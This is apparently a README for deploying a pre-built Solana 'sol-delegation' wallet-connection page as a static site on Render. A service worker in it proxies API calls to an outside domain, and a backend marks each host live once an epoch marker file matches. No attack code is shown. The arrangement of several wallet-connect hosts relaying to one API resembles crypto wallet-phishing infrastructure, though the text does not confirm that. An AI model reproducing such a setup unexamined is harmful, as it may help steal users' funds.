# connection-dist

Built [connection page](https://github.com/suislurper/sol-delegation/tree/main/apps/connection-page)
served by the Render connection-host provider.

Render static site config used by the backend (`render.ts`):

| Field | Value |
|---|---|
| build command | *(none — this repo already contains the build)* |
| publish path | `.` |
| branch | `main` |

## Required files

- `index.html` / `200.html` — connection page with the same-origin API proxy
  bootstrap (`sw-api-proxy.js`) injected.
- `sw-api-proxy.js` — service worker that forwards `/api/*` to
  `https://sol-master-api.cloudcdn.dad`. A static site cannot reverse-proxy,
  so this worker is what makes wallet connect work.
- `_connection-edge.json` — `{"epoch":"edge1"}`. The backend polls
  `https://<host>/_connection-edge.json` and only marks the host live when this
  epoch matches `CONNECTION_EDGE_EPOCH`.

## Regenerating

```bash
cd sol-delegation
VITE_BACKEND_URL= VITE_SERVER_STATIC_PUB=<prod> VITE_SERVER_STATIC_KV=<prod> \
  VITE_WALLETCONNECT_PROJECT_ID=<prod> \
  npm --workspace @sol-delegation/connection-page run build
npx tsx apps/server/scripts/_finalize-connection-dist.ts \
  apps/connection-page/dist edge1 https://sol-master-api.cloudcdn.dad
```

Then copy `apps/connection-page/dist/*` here and commit. Bump the epoch only
together with `CONNECTION_EDGE_EPOCH` in the backend, otherwise live hosts
stop answering the marker.
